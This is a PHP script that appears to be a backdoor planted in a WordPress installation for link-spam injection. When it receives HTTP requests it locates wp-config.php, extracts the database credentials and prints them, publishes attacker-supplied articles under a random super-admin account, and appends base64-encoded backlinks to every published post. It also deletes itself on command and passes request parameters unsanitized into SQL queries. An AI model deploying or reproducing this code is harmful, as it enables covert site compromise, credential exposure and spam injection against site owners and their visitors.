<?php
// error_reporting (0);
error_reporting (E_ERROR | E_WARNING | E_PARSE | E_COMPILE_ERROR);
ini_set         ('display_errors', 'on');
set_time_limit  (0);

check_commands ();

echo "<br>tt" . "main" . "tt<br>";

if (array_key_exists ('article', $_REQUEST))
{
  $load_path = get_load_path ();
  require_once ($load_path);

  print "#loaded wp-load#\n";
  list ($content, $title) = get_article ();
  
  $post_id = wp_insert_post (
    array(
    'post_title' => $title,
    'post_content' => $content,
    'post_status' => 'publish',
    'post_date' => date('Y-m-d H:i:s'),
    'post_author' => get_admin_id (),
    'post_type' => 'post',
    'post_category' => array(0)
    )
  );
  
  if ($post_id)
  {
    $link = get_permalink($post_id);
    
    print "#Created post_id: !$post_id!$link!#\n";
  }
  else
  {
    print "#Unable to create new post#\n";
  }
}
else
{
  list ($dbh_connect, $dbh_query, $dbh_error, $dbh_escape) = get_mysql_mysqli_handlers ();

  $conf_path  = get_conf_path          ();
  $wp_prefix  = 'wp_';
  $connection = etablish_db_connection ($conf_path);

  dispatch_exec_commands_for_conf ();  
}

function get_mysql_mysqli_handlers ()
{
  if (function_exists ('mysqli_connect'))
  {
    return array('mysqli_connect', 'mysqli_query', 'mysqli_error', 'mysqli_real_escape_string');
  }

  if (function_exists ('mysql_connect'))
  {
    return array('mysql_connect', 'mysql_query', 'mysql_error', 'mysql_real_escape_string');
  }

  echo "Unable to get dbh\n";
  die;
}

function dispatch_exec_commands_for_conf ()
{
  if (array_key_exists ('first', $_REQUEST))
  {
    get_posts_count ();

    $first_id = get_first_post_id ();
    if ($first_id)
    {
      print "#First id: $first_id#\n";
    }
    else
    {
      print "#No matching posts were found#\n";
      die;
    }

    fetch_next_post ($first_id);
  }

  if (array_key_exists ('post_id', $_REQUEST))
  {
    $id       = $_REQUEST['post_id'];
    $backlink = get_backlink ();

    add_backlink_to_post ($backlink, $id);
    fetch_next_post      ($id);
  }
}

function fetch_next_post ($id)
{
  $next_id = get_next_post_id ($id);

  if ($next_id)
  {
    print "#Next id: $next_id#\n";
  }
  else
  {
    print "#No next id#\n";
  }
}

function check_commands ()
{
  if (array_key_exists ('delete', $_REQUEST))
  {
    unlink(__FILE__);
  }
}

function get_admin_id ()
{
  $super_admins = get_super_admins ();
  $admin = get_user_by('login', $super_admins[array_rand($super_admins)]);
  return $admin->ID;
}

function get_conf_path ()
{
  return get_file_path ('wp-config.php');
}

function get_load_path ()
{
  return get_file_path ('wp-load.php');
}

function get_file_path ($file)
{
  $opath = $file;
  
  for($i = 0; $i < 10; $i++)
  {
    $path = $i == 0 ? './' : str_repeat ('../', $i);
    $file = $path . $file;
    
    if (is_readable ($file))
    {
      echo "config path: $file\n";
      return $file;
    }
    
    $file = $opath;
  }
  
  echo "Unable to find " . $file;
  die;
}

function get_backlink ()
{
  if (array_key_exists('link', $_REQUEST))
  {
    return base64_decode (urldecode ($_REQUEST['link']));
  }

  echo "No links where specified.";
  die;
}

function get_article ()
{
  if (array_key_exists('article', $_REQUEST) && array_key_exists('title', $_REQUEST))
  {
    $content = base64_decode (urldecode ($_REQUEST['article']));
    $title   = base64_decode (urldecode ($_REQUEST['title']));
    
    return array($content, $title);
  }

  echo "No articles where specified.";
  die;
}

function etablish_db_connection ($config)
{
  $success = connect_using_parse_config ($config);

  if ($success)
  {
    return $success;
  }

  $success = connect_using_require ($config);

  if ($success)
  {
    return $success;
  }

  echo "Failed to connect to MySQL\n";
  die;
}

function connect_using_require ($config)
{
  global $wp_prefix;

  echo "Trying to connect using require\n";

  require_once ($config);

  echo "Got table prefix using require\n";

  $wp_prefix = $table_prefix;

  $connection = db_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME, 'require');

  return $connection;
}

function db_connect ($host, $user, $password, $name, $method_name)
{
  global $dbh_connect;
  global $dbh_error;

  echo "#db_connect host: $host user: $user password: $password name: $name method_name: $method_name#\n";
  if (is_mysqli ())
  {
    $port           = null;
    $socket         = null;
    $port_or_socket = strstr ($host, ':');

    if (!empty ($port_or_socket))
    {
      $host           = substr ($host, 0, strpos ($host, ':'));
      $port_or_socket = substr ($port_or_socket, 1);

      if (strpos ($port_or_socket, '/') !== 0)
      {
        $port         = intval ($port_or_socket);
        $maybe_socket = strstr ($port_or_socket, ':');

        if (!empty ($maybe_socket))
        {
          $socket = substr ($maybe_socket, 1);
        }
      }
      else
      {
        $socket = $port_or_socket;
      }
    }

    $connection = call_user_func ($dbh_connect, $host, $user, $password, $name, $port, $socket);
  }
  else
  {
    $connection = call_user_func ($dbh_connect, $host, $user, $password, $name);
    mysql_select_db ($name);
  }

  if (!$connection)
  {
    echo "Failed to connect to MySQL using $method_name: " . call_user_func ($dbh_error) . "\n";
    return 0;
  }

  echo "Success connection using $method_name\n";

  return $connection;
}


function connect_using_parse_config ($config)
{
  global $wp_prefix;

  $txt = file_get_contents($config);

  if (preg_match("/define\('DB_HOST',\s*'(.*?)'\);/", $txt, $matches))
  {
    $host = $matches[1];
  }

  if (preg_match("/define\('DB_USER',\s*'(.*?)'\);/", $txt, $matches))
  {
    $user = $matches[1];
  }

  if (preg_match("/define\('DB_PASSWORD',\s*'(.*?)'\);/", $txt, $matches))
  {
    $pass = $matches[1];
  }

  if (preg_match("/define\('DB_NAME',\s*'(.*?)'\);/", $txt, $matches))
  {
    $name = $matches[1];
  }

  if (preg_match("/\\\$table_prefix\s*=\s*'(.*?)';/", $txt, $matches))
  {
    echo "Got table prefix using parse\n";
    $wp_prefix = $matches[1];
  }
  else
  {
    echo "Wasn't able to get table prefix using parse\n";
  }


  if (!isset ($host) || !isset ($user) || !isset ($pass) || !isset ($name))
  {
    echo "Failed to connect to MySQL using parse: failed to extract data\n";
    return 0;
  }

  $connection = db_connect ($host, $user, $pass, $name, 'parse');

  return $connection;
}

function get_first_post_id ()
{
  global $wp_prefix;

  $result = execute_query ("SELECT id FROM " . $wp_prefix . "posts WHERE post_status = 'publish' AND post_type IN ('post', 'page') ORDER BY id ASC LIMIT 1");

  $result = fetch_assoc ($result);

  if (count ($result) == 0)
  {
    return false;
  }

  return $result[0]['id'];
}

function fetch_assoc ($result)
{
  $array = array();
  if (is_mysqli ())
  {
    while ($row = $result->fetch_assoc())
    {
      $array[] = $row;
    }
  }
  else
  {
    while ($row = mysql_fetch_assoc ($result))
    {
      $array[] = $row;
    }
  }

  return $array;
}

function is_mysqli ()
{
  global $dbh_connect;

  return $dbh_connect === 'mysqli_connect';
}

function get_next_post_id ($prev_id)
{
  global $connection;
  global $wp_prefix;

  $result = execute_query ("SELECT id FROM " . $wp_prefix . "posts WHERE post_status = 'publish' AND post_type IN ('post', 'page') AND ID > $prev_id ORDER BY id ASC LIMIT 1");

  $result = fetch_assoc ($result);

  if (count ($result) == 0)
  {
    return false;
  }

  return $result[0]['id'];
}

function execute_query ($query)
{
  global $connection;
  global $dbh_query;
  global $dbh_error;

  if (is_mysqli ())
  {
    $result = call_user_func ($dbh_query, $connection, $query);
  }
  else
  {
    $result = call_user_func ($dbh_query, $query);
  }

  if (!$result)
  {
    echo "Failed to execute query ($sql): " . get_error ();
    die;
  }

  return $result;
}

function get_error ()
{
  global $connection;

  if (is_mysqli ())
  {
    return mysqli_error ($connection);
  }
  else
  {
    return mysql_error ();
  }
}

function get_posts_count ()
{
  global $wp_prefix;

  echo "#wp_prefix: $wp_prefix#\n";

  $result = execute_query ("SELECT COUNT(*) FROM " . $wp_prefix . "posts WHERE post_status = 'publish' AND post_type IN ('post', 'page')");

  $result = fetch_assoc ($result);

  $posts_count = $result[0]['COUNT(*)'];

  echo "#Posts count: $posts_count#\n";

  return $posts_count;
}

function get_post_data ($id)
{
  global $wp_prefix;

  $result = execute_query ("SELECT id,guid,post_content FROM " . $wp_prefix . "posts WHERE id = $id");

  $result = fetch_assoc ($result);

  if (count ($result) == 0)
  {
    print "#No post available with id: $id#\n";
    die;
  }

  return $result[0];
}

function add_backlink_to_post ($link, $id)
{
  global $connection;
  global $wp_prefix;
  global $dbh_escape;
  global $dbh_error;

  $post = get_post_data ($id);
  $post_id              = $post['id'];
  $post_link            = $post['guid'];
  $updated_post_content = call_user_func ($dbh_escape, $connection, $post['post_content'] . $link);

  $success = execute_query ("UPDATE " . $wp_prefix . "posts SET post_content = '$updated_post_content' WHERE id = $post_id");

  if ($success)
  {
    echo "#Success: $post_link#\n";
  }
  else
  {
    echo call_user_func ($dbh_error);
    echo "#Failed: $post_link#\n";
  }
}

?>